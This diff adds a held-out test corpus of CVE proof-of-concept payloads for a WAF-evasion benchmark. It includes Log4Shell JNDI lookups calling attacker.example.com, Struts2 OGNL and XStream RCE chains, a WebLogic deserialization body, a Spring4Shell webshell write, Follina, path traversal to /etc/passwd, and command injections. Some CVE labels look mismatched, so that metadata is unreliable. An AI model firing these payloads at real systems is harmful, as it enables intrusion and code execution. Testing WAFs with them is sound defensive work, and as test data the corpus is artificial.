@@ -1,0 +1,144 @@
+schema = 1
+# Held-out CVE PoC corpus per wafrift-bench/methodology.md.
+#
+# THESE PAYLOADS MUST NEVER BE USED TO TUNE wafrift evasion strategies.
+# They are the test set. If something is added here, it does NOT get
+# referenced in rules/, gene-bank seed files, or strategy code.
+#
+# Web/RCE-flavored CVE shapes — the canonical "did it actually fire?"
+# checks for production WAFs. Most of these are textually distinct from
+# the train-set payloads in ../sql/, ../xss/, etc. so the bench is
+# measuring true generalization, not memorization.
+
+[[case]]
+id = "cve_2021_44228_log4shell_basic"
+class = "log4shell"
+payload = "${jndi:ldap://attacker.example.com/a}"
+description = "Log4j JNDI lookup — original disclosure shape"
+
+[[case]]
+id = "cve_2021_44228_log4shell_obfuscated"
+class = "log4shell"
+payload = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.example.com/a}"
+description = "Log4j with full default-substitution obfuscation"
+
+[[case]]
+id = "cve_2021_44228_in_user_agent_position"
+class = "log4shell"
+payload = "Mozilla/5.0 (X11; ${jndi:ldap://attacker.example.com/x}) Gecko"
+description = "Log4j embedded in UA-shaped string (browser tools fed it via UA header)"
+
+[[case]]
+id = "cve_2021_45046_log4shell_followup"
+class = "log4shell"
+payload = "${jndi:ldap://127.0.0.1#attacker.example.com/a}"
+description = "Log4j follow-up bypass (unfixed in 2.15.0)"
+
+[[case]]
+id = "cve_2017_5638_struts_ognl"
+class = "ssti"
+payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+description = "Struts2 OGNL Content-Type RCE"
+
+[[case]]
+id = "cve_2017_9805_struts_xstream"
+class = "xxe"
+mode = "raw_body"
+payload = "<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"><dataHandler><dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"><is class=\"javax.crypto.CipherInputStream\"><cipher class=\"javax.crypto.NullCipher\"><serviceIterator class=\"javax.imageio.spi.FilterIterator\"><iter class=\"javax.imageio.spi.FilterIterator\"><iter class=\"java.util.Collections$EmptyIterator\"/><next class=\"java.lang.ProcessBuilder\"><command><string>id</string></command></next></iter></serviceIterator></cipher></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString></entry></map>"
+description = "Struts2 REST XStream deserialization RCE"
+
+[[case]]
+id = "cve_2018_11776_struts_namespace"
+class = "ssti"
+payload = "${(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('id'))}"
+description = "Struts2 namespace OGNL"
+
+[[case]]
+id = "cve_2019_2725_weblogic_t3"
+class = "ssti"
+payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>/bin/sh</string></void><void index=\"1\"><string>-c</string></void><void index=\"2\"><string>id</string></void></array><void method=\"start\"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>"
+description = "Oracle WebLogic T3 deserialization RCE"
+
+[[case]]
+id = "cve_2021_22205_gitlab_exiftool"
+class = "ssti"
+payload = "(metadata \"xmp:Title\" \"$(/bin/sh -c id)\")"
+description = "GitLab ExifTool DjVu image RCE"
+
+[[case]]
+id = "cve_2021_26084_atlassian_confluence_ognl"
+class = "ssti"
+payload = "queryString=\\u0027%2B%23{Runtime.getRuntime().exec(%22id%22)}%2B\\u0027"
+description = "Confluence OGNL injection in template macro"
+
+[[case]]
+id = "cve_2022_22965_spring4shell"
+class = "ssti"
+payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
+description = "Spring4Shell — class.module.classLoader manipulation"
+
+[[case]]
+id = "cve_2017_5715_ssrf_postgres"
+class = "ssrf"
+payload = "http://127.0.0.1:5432/?query=SELECT%20version()"
+description = "Postgres-via-SSRF probe"
+
+[[case]]
+id = "cve_2018_12613_phpmyadmin_rfi"
+class = "path"
+payload = "?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+description = "phpMyAdmin LFI"
+
+[[case]]
+id = "cve_2018_15473_openssh_userenum"
+class = "cmdi"
+payload = "; ssh-keyscan -t rsa-sha2-512 attacker.example"
+description = "OpenSSH SSH2_MSG_USERAUTH_REQUEST timing"
+
+[[case]]
+id = "cve_2019_15107_webmin_rce"
+class = "cmdi"
+payload = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
+description = "Webmin password reset RCE"
+
+[[case]]
+id = "cve_2020_14882_weblogic_console"
+class = "path"
+payload = "/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(new%20String[]{%22/bin/sh%22,%22-c%22,%22id%22})%22)"
+description = "WebLogic auth bypass + Coherence RCE"
+
+[[case]]
+id = "cve_2021_42013_apache_traversal"
+class = "path"
+payload = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+description = "Apache 2.4.49/50 path traversal + RCE (CVE-2021-42013)"
+
+[[case]]
+id = "cve_2022_30190_follina_msdt"
+class = "ssti"
+payload = "<a href=\"ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=h$(IEX('Invoke-Expression cmd'))i/../../$(IEX('start calc'))i.htm&quot;\">x</a>"
+description = "Follina ms-msdt RCE"
+
+[[case]]
+id = "cve_2022_26134_atlassian_confluence_ognl"
+class = "ssti"
+payload = "${(#_memberAccess[\"allowStaticMethodAccess\"]=true).(@java.lang.Runtime@getRuntime().exec(\"id\"))}"
+description = "Confluence OGNL command execution (CVE-2022-26134)"
+
+[[case]]
+id = "cve_2023_22515_atlassian_confluence_setup"
+class = "path"
+payload = "/setup/setupadministrator.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
+description = "Confluence broken access control"
+
+[[case]]
+id = "cve_2023_22518_atlassian_confluence_data_loss"
+class = "path"
+payload = "/json/setup-restore.action?synchronous=true"
+description = "Confluence improper authorization"
+
+[[case]]
+id = "cve_2024_3094_xz_backdoor_marker"
+class = "cmdi"
+payload = "; sshd -c 'liblzma_la-crc64-fast.o' connection_init_internal"
+description = "XZ backdoor marker (detection probe)"
